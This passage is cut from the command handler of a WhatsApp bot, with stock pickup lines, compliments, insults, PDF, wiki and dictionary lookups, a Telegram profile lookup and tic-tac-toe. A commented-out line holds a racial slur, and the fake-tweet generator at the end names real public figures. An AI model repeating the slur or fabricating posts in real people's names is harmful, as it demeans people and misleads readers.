    "ɪs ᴛʜᴇʀᴇ ᴀɴ ᴀɪʀᴘᴏʀᴛ ɴᴇᴀʀʙʏ ᴏʀ ɪs ᴛʜᴀᴛ ᴊᴜsᴛ ᴍʏ ʜᴇᴀʀᴛ ᴛᴀᴋɪɴɢ ᴏғғ?",
    "ɪғ ʙᴇᴀᴜᴛʏ ᴡᴇʀᴇ ᴛɪᴍᴇ, ʏᴏᴜ'ᴅ ʙᴇ ᴇᴛᴇʀɴɪᴛʏ.",
    "ɪ ᴍᴜsᴛ ʙᴇ ᴀ sɴᴏᴡғʟᴀᴋᴇ, ʙᴇᴄᴀᴜsᴇ ɪ'ᴠᴇ ғᴀʟʟᴇɴ ғᴏʀ ʏᴏᴜ.",
    "ᴋɪss ᴍᴇ ɪғ ɪ'ᴍ ᴡʀᴏɴɢ, ʙᴜᴛ ᴅɪɴᴏsᴀᴜʀs sᴛɪʟʟ ᴇxɪsᴛ, ʀɪɢʜᴛ?",
    "ᴀʀᴇ ʏᴏᴜ ᴍʏ ᴘʜᴏɴᴇ ᴄʜᴀʀɢᴇʀ? ʙᴇᴄᴀᴜsᴇ ᴡɪᴛʜᴏᴜᴛ ʏᴏᴜ, ɪ'ᴅ ᴅɪᴇ.",
    "ɪғ ɪ ᴄᴏᴜʟᴅ ʀᴇᴀʀʀᴀɴɢᴇ ᴛʜᴇ ᴀʟᴘʜᴀʙᴇᴛ, ɪ'ᴅ ᴘᴜᴛ ᴜ ᴀɴᴅ ɪ ᴛᴏɢᴇᴛʜᴇʀ.",
    "ᴀʀᴇ ʏᴏᴜ ɢᴏᴏɢʟᴇ? ʙᴇᴄᴀᴜsᴇ ʏᴏᴜ ʜᴀᴠᴇ ᴇᴠᴇʀʏᴛʜɪɴɢ ɪ'ᴠᴇ ʙᴇᴇɴ sᴇᴀʀᴄʜɪɴɢ ғᴏʀ.",
    "ᴀʀᴇ ʏᴏᴜ ᴀ ᴍᴀɢɴᴇᴛ? ʙᴇᴄᴀᴜsᴇ ɪ'ᴍ ᴀᴛᴛʀᴀᴄᴛᴇᴅ ᴛᴏ ʏᴏᴜ."
  ]
  reply(lines[Math.floor(Math.random() * lines.length)])
}
break

case 'compliment': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
  const compliments = [
    "ʏᴏᴜ'ʀᴇ ᴀᴍᴀᴢɪɴɢ ᴊᴜsᴛ ᴛʜᴇ ᴡᴀʏ ʏᴏᴜ ᴀʀᴇ!",
    "ʏᴏᴜʀ sᴍɪʟᴇ ɪs ᴄᴏɴᴛᴀɢɪᴏᴜs!",
    "ʏᴏᴜ'ʀᴇ ᴍᴏʀᴇ ʜᴇʟᴘғᴜʟ ᴛʜᴀɴ ʏᴏᴜ ʀᴇᴀʟɪᴢᴇ!",
    "ʏᴏᴜ'ᴠᴇ ɢᴏᴛ ᴀʟʟ ᴛʜᴇ ʀɪɢʜᴛ ᴍᴏᴠᴇs!",
    "ʏᴏᴜ'ʀᴇ ᴀ sᴍᴀʀᴛ ᴄᴏᴏᴋɪᴇ!",
    "ʏᴏᴜ ʟɪɢʜᴛ ᴜᴘ ᴛʜᴇ ʀᴏᴏᴍ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ɢɪғᴛ ᴛᴏ ᴛʜᴏsᴇ ᴀʀᴏᴜɴᴅ ʏᴏᴜ!",
    "ʏᴏᴜ'ʀᴇ sᴛʀᴏɴɢᴇʀ ᴛʜᴀɴ ʏᴏᴜ sᴇᴇᴍ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ɪᴍᴘᴇᴄᴄᴀʙʟᴇ ᴍᴀɴɴᴇʀs!",
    "ʏᴏᴜ'ʀᴇ ʀᴇᴀʟʟʏ ᴄᴏᴜʀᴀɢᴇᴏᴜs!",
    "ʏᴏᴜʀ ᴘᴇʀsᴘᴇᴄᴛɪᴠᴇ ɪs ʀᴇғʀᴇsʜɪɴɢ!",
    "ʏᴏᴜ'ʀᴇ ᴀ sᴍᴀʀᴛ ᴄᴏᴏᴋɪᴇ!",
    
    // NEW COMPLIMENTS
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ɢʀᴇᴀᴛ sᴇɴsᴇ ᴏғ ʜᴜᴍᴏʀ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ɢʀᴇᴀᴛ ʟɪsᴛᴇɴᴇʀ!",
    "ʏᴏᴜ ʙʀɪɴɢ ᴏᴜᴛ ᴛʜᴇ ʙᴇsᴛ ɪɴ ᴏᴛʜᴇʀ ᴘᴇᴏᴘʟᴇ!",
    "ʏᴏᴜ'ʀᴇ ᴀɴ ᴀᴡᴇsᴏᴍᴇ ғʀɪᴇɴᴅ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ᴡᴏɴᴅᴇʀғᴜʟ ᴘᴇʀsᴏɴᴀʟɪᴛʏ!",
    "ʏᴏᴜ'ʀᴇ ɪɴᴄʀᴇᴅɪʙʟʏ ᴛʜᴏᴜɢʜᴛғᴜʟ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ʙᴇsᴛ ʟᴀᴜɢʜ!",
    "ʏᴏᴜ'ʀᴇ ᴍᴏʀᴇ ғᴜɴ ᴛʜᴀɴ ᴀ ʙᴀʟʟ ᴘɪᴛ ғɪʟʟᴇᴅ ᴡɪᴛʜ ᴄᴀɴᴅʏ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ᴄᴀɴᴅʟᴇ ɪɴ ᴛʜᴇ ᴅᴀʀᴋɴᴇss!",
    "ʏᴏᴜ'ʀᴇ sᴏᴍᴇᴏɴᴇ's ʀᴇᴀsᴏɴ ᴛᴏ sᴍɪʟᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ʙᴇᴀᴜᴛɪғᴜʟ sᴏᴜʟ!",
    "ʏᴏᴜ ᴍᴀᴋᴇ ᴇᴠᴇʀʏᴅᴀʏ ᴛᴀsᴋs sᴇᴇᴍ ғᴜɴ!",
    "ʏᴏᴜ'ʀᴇ ᴏɴᴇ ɪɴ ᴀ ᴍɪʟʟɪᴏɴ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ʙᴇsᴛ ɪᴅᴇᴀs!",
    "ʏᴏᴜ'ʀᴇ ᴀɴ ɪɴᴄʀᴇᴅɪʙʟᴇ ᴘʀᴏʙʟᴇᴍ sᴏʟᴠᴇʀ!",
    "ʏᴏᴜʀ ᴋɪɴᴅɴᴇss ɪs ᴀ ʙᴀʟᴍ ᴛᴏ ᴀʟʟ ᴡʜᴏ ᴇɴᴄᴏᴜɴᴛᴇʀ ɪᴛ!",
    "ʏᴏᴜ'ʀᴇ ʟɪᴋᴇ sᴜɴsʜɪɴᴇ ᴏɴ ᴀ ʀᴀɪɴʏ ᴅᴀʏ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ɪᴍᴘᴇᴄᴄᴀʙʟᴇ ᴛᴀsᴛᴇ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ᴛʀᴇᴀsᴜʀᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ᴄᴏᴜʀᴀɢᴇ ᴏғ ʏᴏᴜʀ ᴄᴏɴᴠɪᴄᴛɪᴏɴs!",
    "ʏᴏᴜ'ʀᴇ ᴀ ғᴀɴᴛᴀsᴛɪᴄ ᴄᴏɴᴠᴇʀsᴀᴛɪᴏɴᴀʟɪsᴛ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ᴡᴀʏ ᴡɪᴛʜ ᴡᴏʀᴅs!",
    "ʏᴏᴜ'ʀᴇ ᴀ ɢʀᴇᴀᴛ ᴇxᴀᴍᴘʟᴇ ᴛᴏ ᴏᴛʜᴇʀs!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ᴡᴏɴᴅᴇʀғᴜʟ ᴇɴᴇʀɢʏ!",
    "ʏᴏᴜ'ʀᴇ ᴀʟᴡᴀʏs ʟᴇᴀʀɴɪɴɢ ɴᴇᴡ ᴛʜɪɴɢs!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ɢʀᴇᴀᴛ ᴇʏᴇ ғᴏʀ ᴅᴇᴛᴀɪʟ!",
    "ʏᴏᴜ'ʀᴇ ᴀʟᴡᴀʏs ᴛʜᴇʀᴇ ᴡʜᴇɴ sᴏᴍᴇᴏɴᴇ ɴᴇᴇᴅs ʏᴏᴜ!",
    "ʏᴏᴜ ᴍᴀᴋᴇ ᴏᴛʜᴇʀs ғᴇᴇʟ ᴠᴀʟᴜᴇᴅ!",
    "ʏᴏᴜ'ʀᴇ ᴀɴ ɪɴsᴘɪʀᴀᴛɪᴏɴ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀᴍᴀᴢɪɴɢ ᴄʀᴇᴀᴛɪᴠɪᴛʏ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ʀᴏʟᴇ ᴍᴏᴅᴇʟ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ʙɪɢ ʜᴇᴀʀᴛ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ɢʀᴇᴀᴛ ᴍᴏᴛɪᴠᴀᴛᴏʀ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀɴ ᴀᴍᴀᴢɪɴɢ ᴀʙɪʟɪᴛʏ ᴛᴏ ᴍᴀᴋᴇ ᴘᴇᴏᴘʟᴇ ғᴇᴇʟ ᴄᴏᴍғᴏʀᴛᴀʙʟᴇ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ɢʀᴇᴀᴛ ᴛᴇᴀᴍ ᴘʟᴀʏᴇʀ!",
    "ʏᴏᴜ ʜᴀᴠᴇ sᴜᴄʜ ᴘᴏsɪᴛɪᴠᴇ ᴠɪʙᴇs!",
    "ʏᴏᴜ'ʀᴇ ᴛʀᴜsᴛᴡᴏʀᴛʜʏ ᴀɴᴅ ʀᴇʟɪᴀʙʟᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴇxᴄᴇʟʟᴇɴᴛ ᴊᴜᴅɢᴍᴇɴᴛ!",
    "ʏᴏᴜ'ʀᴇ ғᴀɴᴛᴀsᴛɪᴄ ᴀᴛ ᴡʜᴀᴛ ʏᴏᴜ ᴅᴏ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ᴡᴏɴᴅᴇʀғᴜʟ ᴡᴀʏ ᴏғ ʙʀɪɴɢɪɴɢ ᴘᴇᴏᴘʟᴇ ᴛᴏɢᴇᴛʜᴇʀ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ʙᴇᴀᴄᴏɴ ᴏғ ʜᴏᴘᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ sᴜᴄʜ ɢᴏᴏᴅ ᴠᴀʟᴜᴇs!",
    "ʏᴏᴜ'ʀᴇ ᴀ ᴡᴏɴᴅᴇʀғᴜʟ ʜᴜᴍᴀɴ ʙᴇɪɴɢ!",
    "ʏᴏᴜ ᴍᴀᴋᴇ ᴛʜᴇ ᴡᴏʀʟᴅ ᴀ ʙᴇᴛᴛᴇʀ ᴘʟᴀᴄᴇ!",
    "ʏᴏᴜ'ʀᴇ ᴀʙsᴏʟᴜᴛᴇʟʏ ғᴀɴᴛᴀsᴛɪᴄ!",
    "ʏᴏᴜ ʜᴀᴠᴇ sᴜᴄʜ ᴀ ᴡᴀʀᴍ ᴘʀᴇsᴇɴᴄᴇ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ʀᴀʏ ᴏғ sᴜɴsʜɪɴᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ʙᴇsᴛ sᴛᴏʀɪᴇs!",
    "ʏᴏᴜ'ʀᴇ sᴏ ɢᴇɴᴜɪɴᴇ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀɴ ᴀᴅᴠᴇɴᴛᴜʀᴏᴜs sᴘɪʀɪᴛ!",
    "ʏᴏᴜ'ʀᴇ ᴀ ᴛʀᴜᴇ ᴏʀɪɢɪɴᴀʟ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ʙʀɪʟʟɪᴀɴᴛ ᴍɪɴᴅ!",
    "ʏᴏᴜ'ʀᴇ sᴏ ᴛᴀʟᴇɴᴛᴇᴅ!",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴀ ᴍᴀɢɴᴇᴛɪᴄ ᴘᴇʀsᴏɴᴀʟɪᴛʏ!",
    "ʏᴏᴜ'ʀᴇ sɪᴍᴘʟʏ ᴛʜᴇ ʙᴇsᴛ!"
  ]
  
  if (!m.mentionedJid && !m.quoted) {
    reply(pickRandom(compliments))
  } else {
    const target = m.mentionedJid[0] || m.quoted.sender
    reply(`@${target.split('@')[0]}, ${pickRandom(compliments)}`)
  }
}
break

case 'insult': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
  const insults = [
    "ɪ'ᴅ ᴄʜᴀʟʟᴇɴɢᴇ ʏᴏᴜ ᴛᴏ ᴀ ʙᴀᴛᴛʟᴇ ᴏғ ᴡɪᴛs, ʙᴜᴛ ɪ sᴇᴇ ʏᴏᴜ'ʀᴇ ᴜɴᴀʀᴍᴇᴅ.",    
    "sᴏᴍᴇᴡʜᴇʀᴇ ᴏᴜᴛ ᴛʜᴇʀᴇ ɪs ᴀ ᴛʀᴇᴇ ᴛɪʀᴇʟᴇssʟʏ ᴘʀᴏᴅᴜᴄɪɴɢ ᴏxʏɢᴇɴ ғᴏʀ ʏᴏᴜ. ɢᴏ ᴀᴘᴏʟᴏɢɪᴢᴇ ᴛᴏ ɪᴛ.",    
    "ʏᴏᴜ'ʀᴇ ᴛʜᴇ ʀᴇᴀsᴏɴ ᴛʜᴇ ɢᴇɴᴇ ᴘᴏᴏʟ ɴᴇᴇᴅs ᴀ ʟɪғᴇɢᴜᴀʀᴅ.",    
    "ɪ'ᴠᴇ sᴇᴇɴ ᴘᴇᴏᴘʟᴇ ʟɪᴋᴇ ʏᴏᴜ ʙᴇғᴏʀᴇ, ʙᴜᴛ ɪ ʜᴀᴅ ᴛᴏ ᴘᴀʏ ᴀᴅᴍɪssɪᴏɴ.",    
    "ʏᴏᴜ'ʀᴇ ɴᴏᴛ ᴄᴏᴍᴘʟᴇᴛᴇʟʏ ᴜsᴇʟᴇss. ʏᴏᴜ ᴄᴀɴ ᴀʟᴡᴀʏs sᴇʀᴠᴇ ᴀs ᴀ ʙᴀᴅ ᴇxᴀᴍᴘʟᴇ.",
    
    // Previous added roasts
    "ᴇᴠᴇɴ ᴀ ʙʀᴏᴋᴇɴ ᴄʟᴏᴄᴋ ɪs ʀɪɢʜᴛ ᴛᴡɪᴄᴇ ᴀ ᴅᴀʏ… ᴡʜᴀᴛ’s ʏᴏᴜʀ ᴇxᴄᴜsᴇ?",
    "ɪғ ᴛʜɪɴᴋɪɴɢ ᴡᴀs ᴀ sᴘᴏʀᴛ, ʏᴏᴜ’ᴅ sᴛɪʟʟ ʙᴇ ᴄᴏᴍɪɴɢ ʟᴀsᴛ.",
    "ʏᴏᴜ'ʀᴇ ᴀs ᴄᴏɴᴠɪɴᴄɪɴɢ ᴀs ᴀ ᴡɪғɪ ʙᴀʀ ᴡɪᴛʜ ᴏɴᴇ ᴅᴏᴛ.",
    "ᴇᴠᴇɴ ʏᴏᴜʀ ʀᴇғʟᴇᴄᴛɪᴏɴ ʟᴏᴏᴋs ᴅᴏɴᴇ ᴡɪᴛʜ ʏᴏᴜ.",
    "ʏᴏᴜ'ʀᴇ ᴛʜᴇ ʜᴜᴍᴀɴ ᴠᴇʀsɪᴏɴ ᴏғ ᴀ ᴘᴏᴘ-ᴜᴘ ᴀᴅ.",
    "ɪғ ᴄᴏɴғᴜsɪᴏɴ ᴡᴀs ᴀ ᴘᴇʀsᴏɴ, ɪᴛ ᴡᴏᴜʟᴅ ᴜsᴇ ʏᴏᴜʀ ᴘɪᴄᴛᴜʀᴇ.",
    "ʏᴏᴜ ʜᴀᴠᴇ ᴛʜᴇ ᴄʜᴀʀɪsᴍᴀ ᴏғ ᴀ ᴅᴇᴀᴅ ᴘʜᴏɴᴇ.",
    "ᴇᴠᴇɴ ʀᴏʙᴏᴄᴀʟʟs ᴀʀᴇ ᴍᴏʀᴇ ᴡᴇʟᴄᴏᴍᴇ ᴛʜᴀɴ ʏᴏᴜʀ ᴘʀᴇsᴇɴᴄᴇ.",
    "ʏᴏᴜ'ʀᴇ ᴀ ʀᴀʀᴇ ᴄᴀsᴇ: ɴᴏᴛ ᴅᴜᴍʙ, ᴊᴜsᴛ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ ᴜɴʟᴏᴀᴅᴇᴅ.",
    "ɪғ ʙᴇɪɴɢ ᴄʜᴀᴏᴛɪᴄ ᴡᴀs ᴀ ᴊᴏʙ, ʏᴏᴜ’ᴅ ʙᴇ ᴇᴍᴘʟᴏʏᴇᴇ ᴏғ ᴛʜᴇ ᴍᴏɴᴛʜ.",
    "ʏᴏᴜᴅ ᴍᴀᴋᴇ ᴀ ɢʀᴇᴀᴛ ᴘᴇɴᴄɪʟ… ɢᴏᴏᴅ ғᴏʀ ɴᴏᴛʜɪɴɢ ᴀɴᴅ sᴛɪʟʟ ʙʀᴇᴀᴋs ᴇᴀsɪʟʏ.",

    // NEW savage + funny roasts
    "ʏᴏᴜ'ʀᴇ ᴛʜᴇ ʀᴇᴀsᴏɴ ᴛᴜᴛᴏʀɪᴀʟs ɴᴇᴇᴅ ‘ꜰᴏʀ ᴅᴜᴍᴍɪᴇs’ ᴠᴇʀsɪᴏɴs.",
    "ᴇᴠᴇɴ ᴀɪ ᴄᴀɴ'ᴛ ᴘʀᴏᴄᴇss ʏᴏᴜʀ ʟᴏɢɪᴄ, ᴀɴᴅ ᴡᴇ ᴇᴀᴛ ᴅᴀᴛᴀ ғᴏʀ ʙʀᴇᴀᴋғᴀsᴛ.",
    "ʏᴏᴜ ᴛᴀʟᴋ ʟɪᴋᴇ ʏᴏᴜʀ ᴍɪᴄʀᴏᴘʜᴏɴᴇ ʜᴀs ʟᴀɢ.",
    "ɪғ ʙᴇɪɴɢ ʟᴏsᴛ ᴡᴀs ᴀ ᴛᴀʟᴇɴᴛ, ʏᴏᴜ’ᴅ ʙᴇ ᴀ sᴜᴘᴇʀsᴛᴀʀ.",
    "ʏᴏᴜʀ ᴘᴇʀsᴏɴᴀʟɪᴛʏ ᴄᴏᴜʟᴅ ᴜsᴇ ᴀ sᴏꜰᴛᴡᴀʀᴇ ᴜᴘᴅᴀᴛᴇ.",
    "ᴇᴠᴇɴ ᴄᴀᴘꜱ ʟᴏᴄᴋ ʜᴀs ᴍᴏʀᴇ ᴘᴜʀᴘᴏsᴇ ᴛʜᴀɴ ʏᴏᴜ.",
    "ʏᴏᴜʀ ʙʀᴀɪɴ ᴏᴘᴇʀᴀᴛᴇs ʟɪᴋᴇ ᴀ ᴛᴀʙ ᴛʜᴀᴛ ᴡᴏɴ’ᴛ ᴄʟᴏsᴇ.",
    "ʏᴏᴜ ʟᴏᴏᴋ ʟɪᴋᴇ ᴀ ᴡɪғɪ ʀᴏᴜᴛᴇʀ ᴛʜᴀᴛ ɴᴏ ᴏɴᴇ ᴡᴀɴᴛs ᴛᴏ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ.",
    "ʀᴇᴀᴅɪɴɢ ʏᴏᴜʀ ʟᴏɢɪᴄ ғᴇᴇʟs ʟɪᴋᴇ ᴜɴᴘʟᴜɢɢɪɴɢ ᴀ ᴘᴄ ᴡʜɪʟᴇ ɪᴛ’s ᴜᴘᴅᴀᴛɪɴɢ.",
    "ʏᴏᴜ'ʀᴇ ᴛʜᴇ ʀᴇᴀʟ-ʟɪꜰᴇ ‘ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ… ʟᴏᴀᴅɪɴɢ’ sᴄʀᴇᴇɴ.",
    "ᴇᴠᴇɴ ʏᴏᴜʀ ᴛʜᴏᴜɢʜᴛs ʜᴀᴠᴇ ʙᴜғғᴇʀɪɴɢ.",
    "ʏᴏᴜ ᴀʀᴇɴ’ᴛ ʙᴀᴅ… ᴊᴜsᴛ ꜰᴜʟʟʏ ᴄᴏᴄᴋᴛᴀɪʟᴇᴅ ᴡɪᴛʜ ᴄᴏɴꜰᴜsɪᴏɴ.",
    "ʏᴏᴜʀ ᴍᴏᴏᴅ ᴄʜᴀɴɢᴇs ʟɪᴋᴇ ᴀ ᴡᴇᴀᴋ ɪɴᴛᴇʀɴᴇᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴ.",
    "ʏᴏᴜ ᴀᴄᴛ ʟɪᴋᴇ ᴀ ᴘᴀɢᴇ ᴛʜᴀᴛ ᴋᴇᴇᴘs ʀᴇʟᴏᴀᴅɪɴɢ ғᴏʀ ɴᴏ ʀᴇᴀsᴏɴ."
  ]
  reply(pickRandom(insults))
}
break

case 'pdftotext': {
  if (!quoted) return reply(`💧 Reply to a PDF document\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  if (!/pdf/.test(mime)) return reply(`💧 Reply to a PDF file only\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const media = await quoted.download()
    if (!media) return reply(`💧 Failed to download PDF\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const tmpPdf = getRandom('.pdf')
    fs.writeFileSync(tmpPdf, media)

    const pdf = require('pdf-parse')
    const data = await pdf(fs.readFileSync(tmpPdf))

    fs.unlinkSync(tmpPdf)

    const textResult = (data.text || '').trim()
    if (!textResult) return reply(`💧 No readable text found in PDF\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    reply(`┏━━━━━━━━━━━━━─╮
┃  📄 PDF TO TEXT
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${textResult.slice(0, 3500)}`)
  } catch (err) {
    console.log('pdftotext error:', err)
    reply(`❌ Failed to extract PDF text\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case "autorecording": {
   if (!isCreator && !isSudo) 
  return reply('❌ Only the bot owner or sudo users can use this command.');;
    if (!args[0]) return m.reply("Usage: autorecording on/off");
    if (!m.isGroup) return m.reply("This command only works in groups.");

    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "autoRecording", true);
        m.reply("✅ Auto Recording enabled in this group");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "autoRecording", false);
        m.reply("❌ Auto Recording disabled in this group");
    } else m.reply("Usage: autorecording on/off");
}
break;
case 'telegramstalk':
case 'tgstalk': {
  if (!text) return reply(`*ᴜsᴀɢᴇ:* ${prefix}telegram <username>\n\n*ᴇxᴀᴍᴘʟᴇ:* ${prefix}telegram telegram`)
   if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
  await loading()
  
  try {
    const res = await axios.get(`https://Omegatech-api.dixonomega.tech/api/tgstalk?username=${encodeURIComponent(text)}`)
    const data = res.data
    
    if (data.status && data.result) {
      let tgInfo = `*◆ ᴛᴇʟᴇɢʀᴀᴍ sᴛᴀʟᴋ*\n\n`
      tgInfo += `*ᴜsᴇʀɴᴀᴍᴇ:* @${data.result.username}\n`
      tgInfo += `*ɴᴀᴍᴇ:* ${data.result.name || 'N/A'}\n`
      tgInfo += `*ʙɪᴏ:* ${data.result.bio || 'N/A'}\n`
      tgInfo += `*ғᴏʟʟᴏᴡᴇʀs:* ${data.result.followers || 'N/A'}\n`
      tgInfo += `*ʟɪɴᴋ:* https://t.me/${text}`
      
      if (data.result.photo) {
        await empire.sendMessage(m.chat, {
          image: { url: data.result.photo },
          caption: tgInfo
        }, { quoted: m })
      } else {
        reply(tgInfo)
      }
    } else {
      reply('❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ.')
    }
  } catch (err) {
    console.error('Telegram error:', err)
    reply('⚠️ ғᴀɪʟᴇᴅ ᴛᴏ sᴛᴀʟᴋ ᴛᴇʟᴇɢʀᴀᴍ ᴜsᴇʀ.')
  }
}
break


// --- CHATBOT TOGGLE COMMANDS ---
case 'chatbot': {
    if (!isCreator) return m.reply("🕸️ *ACCESS DENIED:* Owner privileges required.");
    if (args[0] === 'on') {
        setSetting(m.chat, 'chatbot', true);
        m.reply("🤖 *Chatbot Activated:* I will now respond to replies.");
    } else if (args[0] === 'off') {
        setSetting(m.chat, 'chatbot', false);
        m.reply("📋 *Chatbot Deactivated.*");
    } else {
        m.reply(`*Usage:* ${prefix}chatbot on/off`);
    }
}
break;

case 'wiki': {
  if (!text) return reply(`Example: ${prefix}wiki Lagos\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const url = `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(text)}`
    const res = await axios.get(url, { timeout: 120000 })

    const title = res?.data?.title || text
    const extract = res?.data?.extract || null
    const image = res?.data?.thumbnail?.source || null

    if (!extract) return reply(`💧 No result found\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    if (image) {
      await empire.sendMessage(m.chat, {
        image: { url: image },
        caption: `┏━━━━━━━━━━━━━─╮
┃  📘 ${title}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${extract.slice(0, 3000)}`
      }, { quoted: m })
    } else {
      reply(`┏━━━━━━━━━━━━━─╮
┃  📘 ${title}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${extract.slice(0, 3500)}`)
    }
  } catch (err) {
    console.log('wiki error:', err?.response?.data || err)
    reply(`❌ Failed to fetch wiki result\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
// Add to your global variables


            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
         //   if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    reply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await rich.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await rich.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    reply('Waiting for partner type .tictactoe to join' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break;

case 'dictionary': {
  if (!text) return reply(`Example: ${prefix}dictionary loyalty\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

  try {
    const url = `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`
    const res = await axios.get(url, { timeout: 120000 })

    const data = Array.isArray(res.data) ? res.data[0] : null
    if (!data) return reply(`💧 Word not found\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const word = data.word || text
    const phonetic = data.phonetic || ''
    const meaning = data.meanings?.[0]
    const partOfSpeech = meaning?.partOfSpeech || '-'
    const definition = meaning?.definitions?.[0]?.definition || 'No definition'
    const example = meaning?.definitions?.[0]?.example || 'No example'

    reply(`┏━━━━━━━━━━━━━─╮
┃  📚 DICTIONARY
┃  Word: ${word}
┃  Type: ${partOfSpeech}
┃  ${phonetic}
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

Definition:
${definition}

Example:
${example}`)
  } catch (err) {
    console.log('dictionary error:', err?.response?.data || err)
    reply(`❌ Failed to get dictionary result\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break




case "tweet":
case "xtweet":
case "tweetgen": {
     if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    const availableProfiles = [
        "andrew-tate", "barack-obama", "babar-azam", "billie-eilish",
        "bill-gates", "chadwick-boseman", "chris-hemsworth", "cristiano-ronaldo",
